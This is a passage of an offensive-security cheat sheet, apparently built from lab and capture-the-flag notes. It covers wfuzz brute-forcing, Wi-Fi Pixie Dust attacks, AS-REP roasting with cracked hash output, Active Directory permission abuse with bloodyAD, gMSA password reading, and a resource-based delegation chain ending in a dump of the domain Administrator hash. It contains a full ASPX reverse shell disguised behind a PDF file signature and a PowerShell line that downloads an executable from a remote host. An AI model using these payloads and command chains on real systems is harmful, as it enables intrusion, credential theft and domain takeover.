wfuzz -c -w users.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "Cookie:id=1312321&user=FUZZ"  "http://example.com/index.php"
```

Cookie/Header bruteforce (vhost brute). User-Agent, filter code (hide), proxy:

```shell
wfuzz -c -w user-agents.txt -p 127.0.0.1:8080:HTTP --ss "Welcome " -H "User-Agent: FUZZ"  "http://example.com/index.php"
```

## Wi-Fi

**[`^        back to top        ^`](#overview)**

Scan avaliable an access point:

```shell
iwlist scanning
```

Pixie Dust attack on a specified BSSID with [oneshot](https://github.com/nikita-yfh/OneShot-C):

```shell
./oneshot -i wlan0 -K --bssid 02:00:00:00:01:00
```

Write `SSID` and `PSK` values to the `config` via `wpa_passphrase`:

```shell
wpa_passphrase ACCESS_POINT_SSID 'PASSWORD' > config
```

Connect to the Wi-Fi via `wpa_supplicant`:

```shell
wpa_supplicant -B -c config -i wlan0
```

Set the static IP to `wlan0` interface:

```shell
ifconfig wlan0 192.168.1.7 netmask 255.255.255.0

ifconfig
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.7  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:800  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:08:00  txqueuelen 1000  (Ethernet)
        RX packets 2  bytes 282 (282.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10  bytes 1084 (1.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Or use another way for connecting to Wi-Fi. Configuration file `/etc/wpa_supplicant/wpa_supplicant-wlan0.conf`:

```shell
ctrl_interface=/var/run/wpa_supplicant
ctrl_interface_group=0
update_config=1

network={
  ssid="ACCESS_POINT_SSID"
  psk="PASSWORD"
  key_mgmt=WPA-PSK
  proto=WPA2
  pairwise=CCMP TKIP
  group=CCMP TKIP
  scan_ssid=1
}
```

Configuration file `/etc/systemd/network/25-wlan.network`:

```shell
[Match]
Name=wlan0

[Network]
DHCP=ipv4
```

Execute the command:

```shell
systemctl enable wpa_supplicant@wlan0.service
systemctl restart systemd-networkd.service
systemctl restart wpa_supplicant@wlan0.service
```

Find an active IP-addresses in the `wlan0` network:

```shell
for i in `seq 1 255`; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
```

## Windows

**[`^        back to top        ^`](#overview)**

### ASPX

Initial PDF file signature, it should be similar to `%PDF-1.7`.

Take the ASPX reverse shell `https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx` and change its port and IP address to your own:

```shell
%PDF-1.7
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip

        protected void Page_Load(object sender, EventArgs e)
    {
            String host = "<host>"; //CHANGE THIS
            int port = 4444; ////CHANGE THIS

        CallbackShell(host, port);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }


    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;

    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;

    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo,
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);

    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);


   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }


   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);



   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
       IntPtr pSid,
       StringBuilder Account,
       ref int cbName,
       StringBuilder DomainName,
       ref int cbDomainName,
       ref int peUse

   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,
        uint dwOpenMode,
        uint dwPipeMode,
        uint nMaxInstances,
        uint nOutBufferSize,
        uint nInBufferSize,
        uint nDefaultTimeOut,
        IntPtr pipeSecurityDescriptor
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,
        uint lpOverlapped
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );

    protected void CallbackShell(string server, int port)
    {

        string request = "Spawn Shell...\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;

        sockaddr_in socketinfo;
        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
        socketinfo = new sockaddr_in();
        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
        socketinfo.sin_addr = inet_addr(server);
        socketinfo.sin_port = (short) htons((ushort)port);
        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
        send(oursocket, bytesSent, request.Length, 0);
        SpawnProcessAsPriv(oursocket);
        closesocket(oursocket);
    }

    protected void SpawnProcess(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec");
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
    }

    protected void SpawnProcessAsPriv(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec");
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        IntPtr DupeToken = new IntPtr(0);
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        if (DupeToken == IntPtr.Zero)
            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        else
            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
        CloseHandle(DupeToken);
    }
    </script>
```

### ASREPRoast

AS-REP Roasting to get user hashes:

```shell
$ impacket-GetNPUsers <host>/ -usersfile users.txt -outputfile outputusers.txt -dc-ip <host> -no-pass

$ cat outputusers.txt
$krb5asrep$23$jmontgomery@<DOMAIN>:7d8cc128c583c382aef2a6fa2d4ec321$cb396eb66b794e5e909d71ffa4cd6685dde517e4b96e493c8e659f0e3ba3115fa7efea11ec14040a382676bd5c37911354af87397d9bd91882c7127304c2194fba95c7f83e15473ace5ec5769f7711d54f91c51b75510b725348e8b78761874a4e54057056c599d94a491a6c9c347221e7215bb99cc528bbeb530293866662b9c23a13981ce41dc105f1a1d331ad818f547cb21fe3e24bc27ba18558cd002a258603b56709bf9670fff20af3bc0a1e8bbde3106439fb27427ddebe4a91cfa09cdfa8642a230f9cd6ea06d331b5d91435235bafaeaeb5200c75b110643f58cb53a0c4
$krb5asrep$23$lbradford@<DOMAIN>:1ed6777b1a90024c90cb66b7d3fc3578$8eef92a40e9c405e101e8383169fa8db91202010db8d64a242ab0ec9914d0a17f394b519b3ef8bb138faaba0fb85b91521d0629af96b66eae6e50eed31a9629753ca7f875b803a8546cd368010f40f11a2937576d4129380ec9edfafc18b3e2f2414a08747ba6d3e963a3dfa100dc48d1fb2cec6132343e9bc4bba7aed44ee7e259f24eda2e69ccd93a754133fd133028598f72c6c6d04fc0b9c029e1504454cbc6c2d5cb22f4549810b9b5694d23f6a8726ccbebdb07820bda7ff181dc16c65bdfb375c971833562f6c4efc44fd6a338ad0c2f9d9a30eabc6809ab8a5ef7b9f0a85
$krb5asrep$23$mlowe@<DOMAIN>:8d268a1ce5040c77262d6fb3e00dd850$4ccd13bd24c517bcc0d6a8aee6030dcec36cdf7ef347b5bace1633fde2438bf675fc57451df849641b5ac4ee13eb603b3a4aa48bff9aee0c7803d9173b3f55289f6ff9cd26a26b9b568e4c72e4c1f78368b9ad28fe0c5a4992c6ac8f347414f19474366bbfe8ae5260e205b08c589d2dbc7adb7ebbc3827cd0071f3e78bf4167c310a4a2514ac044d0540b5d9ba546b19d4f34062f68df5935b9af9f5cff893ceba13c34d452f23249a56e0cc39adc239fad13e6775c8d10541e0ed59594971e7b0f0e792c0b982cd00d4c90fb9aea9d1e44e6ad81a8fa38b2b370b00f241040a106
```

Get three hashes. Use hashcat:

```shell
$ hashcat -m 18200 outputusers.txt /usr/share/wordlists/rockyou.txt

$krb5asrep$23$jmontgomery@<DOMAIN>:7d8cc128c583c382aef2a6fa2d4ec321$cb396eb66b794e5e909d71ffa4cd6685dde517e4b96e493c8e659f0e3ba3115fa7efea11ec14040a382676bd5c37911354af87397d9bd91882c7127304c2194fba95c7f83e15473ace5ec5769f7711d54f91c51b75510b725348e8b78761874a4e54057056c599d94a491a6c9c347221e7215bb99cc528bbeb530293866662b9c23a13981ce41dc105f1a1d331ad818f547cb21fe3e24bc27ba18558cd002a258603b56709bf9670fff20af3bc0a1e8bbde3106439fb27427ddebe4a91cfa09cdfa8642a230f9cd6ea06d331b5d91435235bafaeaeb5200c75b110643f58cb53a0c4:Midnight_121
```

### bloodyAD

Add the USERNAME to the `ServiceMgmt` group, using bloody:

```shell
bloodyAD -u AUTH_USERNAME -p 'PASSWORD' -d <domain> --host IP add groupMember SERVICEMGMT USERNAME
[+] USERNAME added to SERVICEMGMT
```

Give USERNAME `GenericAll` permissions on the OU and then change the `winrm_svc` user's password to a different.

```shell
bloodyAD -d <domain> -u AUTH_USERNAME -p 'PASSWORD' --host dc01.<host> add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' USERNAME
[+] USERNAME has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB

bloodyAD -d <domain> -u AUTH_USERNAME -p 'PASSWORD' --host dc01.<host> set password winrm_svc '#Test00#'
[+] Password changed successfully!
```

#### Read GMSA password

Bloodhound enumeration shows that tbrady has ReadGMSAPassword privilege outbound to delegator$ machine account. Moreover, delegator$ account has AllowedToDelegateTo on the DC:
You can compile the exe you need by yourself, or you can use the compiled exe directly.

> rvazarkar/GMSAPasswordReader - https://github.com/rvazarkar/GMSAPasswordReader
> Toolies/GMSAPasswordReader.exe at master · expl0itabl3/Toolies - https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe
> OffensivePythonPipeline/binaries/gMSADumper_windows.exe at main · Qazeer/OffensivePythonPipeline - https://github.com/Qazeer/OffensivePythonPipeline/blob/main/binaries/gMSADumper_windows.exe

I haven’t tried this step, I’ll post someone else’s code.

```shell
powershell -exec bypass -c "iwr http://REMOTE_IP:7777/GMSAPasswordReader.exe -outfile gmsa.exe"

C:\temp>gmsa.exe --accountname delegator$
gmsa.exe --accountname delegator$
Calculating hashes for Old Value
[*] Input username             : delegator$
[*] Input domain               : <DOMAIN>
[*] Salt                       : <DOMAIN>delegator$
[*]       rc4_hmac             : B8EE5490AD4BAFE753FEC009F1105817
[*]       aes128_cts_hmac_sha1 : 6CDAE5ECCDF096616A16B36BF10C80CF
[*]       aes256_cts_hmac_sha1 : BD5983A384D2FA0F43CC0C4775DEF12414DF235E1A9B5053F1FDC0ECA325D9B3
[*]       des_cbc_md5          : 85D6DF1ADCC731A1

Calculating hashes for Current Value
[*] Input username             : delegator$
[*] Input domain               : <DOMAIN>
[*] Salt                       : <DOMAIN>delegator$
[*]       rc4_hmac             : 9B0CCB7D34C670B2A9C81C45BC8BEFC3
[*]       aes128_cts_hmac_sha1 : DFAADA2566F98168071386B8AB83806C
[*]       aes256_cts_hmac_sha1 : 3D9FD157B4D18C641E7DDA0D8997AF92AD4832C823BEF1238D6D54A5D147DA92
[*]       des_cbc_md5          : 7A58673EE3DA67B0
```

It’s significate that we can read the hash NT of gMSA delegator$ account. What I tried locally was to get it remotely and synchronize the time. One of the ways:

```shell
sudo ntpdate -s dc01.<host>
bloodyAD -d <host> -u AUTH_USERNAME -p 'PASSWORD' --host dc01.<host> get object 'delegator$' --attr msDS-ManagedPassword
```

### Bloodhound

Bloodhound using for get useful information about domain:

```shell
sudo ntpdate -s dc01.<host>
bloodhound-python -u USERNAME -p 'PASSWORD' -ns IP -d <host> -c All
```

### Bypass Constrained Delegation restrictions with RBCD

With delegator$ machine account, it’s possible to exploit constrained delegation (KCD) but Administrator domain user has restrictions.

The “Account is sensitive and cannot be delegated” flag (NOT_DELEGATED value in UserAccountControl) ensures that an account’s credentials cannot be forwarded to other computers or services on the network by a trusted application.

Continuing back to BloodHound, DELEGATOR allows delegation `dc01.<domain>`.

According to the previous statement, only kerberos authentication is allowed, search, reference, mainly KCD-self-rbcd:

> Abusing Kerberos Constrained Delegation without Protocol Transition - https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html.
> (KCD) Constrained - The Hacker Recipes - https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained.
> (RBCD) Resource-based constrained - The Hacker Recipes - https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd.
> Resource-Based Constrained Delegation Abuse - https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/.

There are two ways here, one is to obtain TGT through NTLM, and the other is to use aes key, but this AES key is different from the one obtained by the previous gmsa exe (finally secretsdump can get the correct AES-key). Here are my own notes on the process:

```shell
# NTLM TGT method
unset KRB5CCNAME

# Service A, also known as delegator$, requests a forwardable TGT from the KDC
sudo ntpdate -s dc01.<domain>
getTGT.py '<domain>/delegator$@dc01.<domain>' -hashes :8689904d05752e977a546e201d09e724
export KRB5CCNAME=delegator\$.ccache

# NTLM TGT approach, using the delegator$ TGT setup rbcd obtained above via ntlm hash (setup to allow ldap_monitor to delegate to the delegator)
# Resource-Based Constrained Delegation configures resources in Windows. Here, ldap_monitor is allowed to delegate to delegator$, i.e., the SID of ldap_monitor is configured in delegator$.
sudo ntpdate -s dc01.<domain>
rbcd.py '<domain>/delegator$' -delegate-to 'delegator$' -delegate-from ldap_monitor -use-ldaps -action write -k -no-pass -dc-ip <host> -debug

# Then get the TGT of ldap_monitor
# Here you need ldap_monitor to apply TGT with your own account password.
sudo ntpdate -s dc01.<domain>
getTGT.py -dc-ip "dc01.<domain>" "<domain>"/'ldap_monitor':'1GR8t@$$4u'
export KRB5CCNAME=ldap_monitor.ccache

# Get ST, in bloodhound you can see the spn is browser/dc01.<domain>
# Here is the above ldap_monitor applying for TGT with its own account password, then applying for access to its own ST in the name of the dc01$ account
sudo ntpdate -s dc01.<domain>
getST.py -spn "browser/dc01.<domain>" -impersonate "dc01$" "<domain>/ldap_monitor" -k -no-pass
export KRB5CCNAME=./delegator\$@dc01.<domain>.ccache

# The TGS obtained in the previous step is not forwardable, you need to put the TGS obtained in the previous step in additional_tickets. ldap_monitor then applies http/dc01.<domain> as dc01$ for ST
# Description of the -additional-ticket parameter : Include forwardable service tickets in S4U2Proxy requests for RBCD + KCD Kerberos only.
# NTLM TGT approach, still using the delegator$ TGT obtained above via ntlm hash
sudo ntpdate -s dc01.<domain>
getST.py -spn 'http/dc01.<domain>' -impersonate 'dc01$' -additional-ticket 'dc01$.ccache' '<domain>/delegator$' -k -no-pass
export KRB5CCNAME=dc01\$.ccache

# Simulated dc01 machine account, now you can secretsdump (here $ to use \ escape, I did not escape has been failing, tried for a long time to find)
sudo ntpdate -s dc01.<domain>
secretsdump.py -no-pass -k dc01.<domain> -just-dc-ntlm
```

There is a technique that allows to bypass (The “Account is sensitive and cannot be delegated”) it with RBCD (Resource-based Constrained Delegation):

```shell
sudo ntpdate -s dc01.<domain>
getTGT.py -dc-ip "dc01.<domain>" <domain>/'delegator$' -hashes ':8689904d05752e977a546e201d09e724'
export KRB5CCNAME=delegator\$.ccache

sudo ntpdate -s dc01.<domain>
rbcd.py '<domain>/delegator$' -delegate-to 'delegator$' -delegate-from ldap_monitor -use-ldaps -action write -k -no-pass -dc-ip <host> -debug

sudo ntpdate -s dc01.<domain>
getTGT.py -dc-ip "dc01.<domain>" "<domain>"/'ldap_monitor':'1GR8t@$$4u'
export KRB5CCNAME=ldap_monitor.ccache

sudo ntpdate -s dc01.<domain>
getST.py -spn "browser/dc01.<domain>" -impersonate "dc01$" "<domain>/ldap_monitor" -k -no-pass
export KRB5CCNAME=./delegator\$@dc01.<domain>.ccache

sudo ntpdate -s dc01.<domain>
getST.py -spn 'http/dc01.<domain>' -impersonate 'dc01$' -additional-ticket 'dc01$.ccache' '<domain>/delegator$' -k -no-pass
export KRB5CCNAME=dc01\$.ccache

sudo ntpdate -s dc01.<domain>
secretsdump.py -no-pass -k dc01.<domain> -just-dc-ntlm
```

Output:

```shell
$ unset KRB5CCNAME
$ sudo ntpdate -s dc01.<domain>
$ getTGT.py '<domain>/delegator$@dc01.<domain>' -hashes :8689904d05752e977a546e201d09e724
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in delegator$@dc01.<domain>.ccache

$ export KRB5CCNAME=./delegator\$@dc01.<domain>.ccache

$ sudo ntpdate -s dc01.<domain>
$ rbcd.py -k -no-pass '<domain>/delegator$' -delegate-to 'delegator$' -use-ldaps -debug -action write -delegate-from ldap_monitor
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Using Kerberos Cache: ./delegator$@dc01.<domain>.ccache
[+] SPN LDAP/DC01@<DOMAIN> not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/<DOMAIN>@<DOMAIN>
[+] Using TGT from cache
[+] Trying to connect to KDC at <DOMAIN>
[+] Initializing domainDumper()
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)

$ sudo ntpdate -s dc01.<domain>
$ getTGT.py <domain>/ldap_monitor:'1GR8t@$$4u'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in ldap_monitor.ccache

$ export KRB5CCNAME=./ldap_monitor.ccache

$ sudo ntpdate -s dc01.<domain>
$ getST.py -spn "browser/dc01.<domain>" -impersonate "dc01$" "<domain>/ldap_monitor" -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
[*] Impersonating dc01$
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in dc01$.ccache

export KRB5CCNAME=./delegator\$@dc01.<domain>.ccache

$ sudo ntpdate -s dc01.<domain>
$ getST.py -spn 'http/dc01.<domain>' -impersonate 'dc01$' -additional-ticket 'dc01$.ccache' '<domain>/delegator$' -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
[*] Impersonating dc01$
[*]     Using additional ticket dc01$.ccache instead of S4U2Self
[*]     Requesting S4U2Proxy
[*] Saving ticket in dc01$.ccache

$ export KRB5CCNAME=dc01\$.ccache
$ sudo ntpdate -s dc01.<domain>
$ secretsdump.py -no-pass -k dc01.<domain> -just-dc-ntlm
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
